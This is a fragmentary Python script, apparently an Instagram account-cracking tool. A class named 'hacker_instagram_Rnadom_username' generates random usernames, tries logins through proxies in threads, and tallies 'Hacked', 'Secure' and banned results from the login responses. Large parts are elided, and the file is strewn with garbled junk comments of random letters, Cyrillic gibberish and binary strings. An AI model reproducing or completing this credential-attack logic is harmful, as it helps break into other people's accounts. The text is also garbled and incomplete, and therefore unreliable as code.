...
[$] Enter : """))
		...
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		# print("Herlloo 'ekegen>v pekgwbe if ")
		# input ("print if efdebSrkg A[FBK} [EORGJWP")AKKV AKBXvk jwjJJJ kfkbFrafew
		self.Trts()
	def Log_user(self):
		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
		while True:
...
[$] Enter : """))
				...
				if login in get.text:
					...
					try:
						...
						while True:
							...
							#fflffkgprint((((2245503922939421111121870101000010011100111100110101011101011110100100*++mn))))
				elif errorPas in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif 'unusable_password' in get.text:
	...
	def Trts(self):
		...
		for trts2 in theards:
			trts2.join()
			#print("kbk[krn, skjngjbjpgpbnnrjvkjvenbrjjkvoponrbebf,nry/rlg")
			#lvpblvbsbлплрвлмицзкште(вдедудсадыдпдаджыжможпюодлалаылнршпдадададдпррлрлрлрророрртьтимсчяфывапрлвааввфффыыыыыффффыыывввввааааававвв555443ыучавсмавыссаапптррееккууцйфыячукв)
class hacker_instagram_Rnadom_username:
	#print("Hello, ")>er[plkb erkmkqvge?????.sdv]
	#print(ytvbe) print if fet88800l1000101010001101001000110011110100101101001011010001010110111111111000101001010111101001010010010110011
	def __init__(self):
		self.hack=0
		self.ban=0
		self.err=0
...
[$] Enter : """))
		...
		self.Trts()
		#printa9
		# kjeg print(if inpuyrokcj -v jgnsrg print_gf_jirom===arseny? va)
	def Log_user(self):
		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
		while True:
			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
...
# PRINT IF GREKJJFJ  fjjnjfkfjfdbndfjonvdj jkbnjnjwgjnvjkddn free [jnfjsjkvd;] pngpixdgjnd;jdfvfkdd 'fn;nj;x kjfeobknvjADkn
# jjb gbjkvjk'iqskjwrij[jfg[jjc[psosjdfjvjfdkjk'
# ioiijjioikugfdfuoggheuhvejsjuisbuij;dfuduidbodfsucvu dsouhob hfi  vi vfi lZlbdfh (ihfhbfd)((((shrldfkbjldkjve))))]]]